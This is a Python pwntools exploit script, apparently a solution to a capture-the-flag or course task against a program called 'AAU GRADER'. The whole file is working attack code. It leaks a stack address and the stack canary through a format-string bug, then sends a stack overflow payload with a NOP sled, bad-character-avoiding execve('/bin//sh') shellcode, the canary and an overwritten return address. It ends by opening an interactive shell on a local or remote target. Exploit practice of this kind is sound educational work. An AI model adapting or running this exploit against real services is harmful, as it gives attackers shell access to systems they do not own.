#!/usr/bin/env python3
import argparse

from pwn import *

# Leak address from stack and the canary
def leak_data(proc) -> str:
    proc.recvuntil(b"Semester: ")

    format_leak_start_nopsled = "%1$p"
    format_leak_canary = "%31$p"

    # Format the output so it is easier to parse
    # _<addr>:<addr2>_
    format_leak = f"_{format_leak_start_nopsled}:{format_leak_canary}_"
    proc.sendline(format_leak.encode())

    return str(proc.recvuntil(b"Username: "))

def main(p):
    # https://shell-storm.org/shellcode/files/shellcode-846.html
    # badchars: 0x0a,0x0b,0x0c,0x0d
   
    leaked_data = leak_data(p) # _0xfff43712:0x64176300_
    raw_parsed_addresses = leaked_data.split("_")[1].split("_")[0]
    raw_str_nop_addr = raw_parsed_addresses.split(":")[0]
    canary = int(raw_parsed_addresses.split(":")[1], 16).to_bytes(4, byteorder="little")

    # print(canary)
    
    leaked_addr_offset = 14 # Distance from leaked address to start of NOP sled
    nopsled_end_offset = 32 # Distance from leaked address to end of NOP sled, PUSHED elements overwrite the NOP sled
     
    nopsled_end = (int(raw_str_nop_addr, 16) + nopsled_end_offset).to_bytes(4, byteorder='little') 
    nopsled_start = (int(raw_str_nop_addr, 16) + leaked_addr_offset).to_bytes(4, byteorder='little') 

    shellcode = b""
    shellcode += b"\xbc" + nopsled_end   #  mov    esp,<NOPSLED_END>
    shellcode += b"\x31\xc0"             #  xor    eax,eax
    shellcode += b"\x50"                 #  push   eax
    shellcode += b"\x68\x2f\x2f\x73\x68" #  push   0x68732f2f
    shellcode += b"\x68\x2f\x62\x69\x6e" #  push   0x6e69622f
    shellcode += b"\x89\xe3"             #  mov    ebx,esp
    shellcode += b"\x50"                 #  push   eax
    shellcode += b"\x53"                 #  push   ebx
    shellcode += b"\x89\xe1"             #  mov    ecx,esp
    shellcode += b"\xb0\xa0"             #  mov    al,0xa0 <____ Trick to avoid bad char 0x0b = syscall 11 
    shellcode += b"\x2c\x95"             #  sub    al,0x95 <__/
    shellcode += b"\xcd\x80"             #  int    0x80 <- SYSCALL 

    padding = 80

    payload = b"\x90" * (padding - len(shellcode))
    payload += shellcode
    payload += canary
    payload += b"A"*12
    payload += nopsled_start

    print(f"Sending payload\n {payload}")
    p.sendline(payload)
    p.interactive()

if __name__=="__main__":

    parser = argparse.ArgumentParser(description='AAU GRADER Exploitation Program 3000')
    parser.add_argument('-b', '--binary', type=str, help='Specify local binary')
    parser.add_argument('-s', '--server', type=str, help='Specify server hostname / ip')
    parser.add_argument('-p', '--port', type=str, help='Specify port for server')
    args = parser.parse_args()

    p = None
    if args.binary != None:
        BINARY = args.binary
        exe = context.binary = ELF(BINARY)
        p = process(BINARY)
    elif args.server != None and args.port != None:
        p = connect(args.server, int(args.port))
    else:
        print(parser.format_help())
        exit(0)

    main(p)
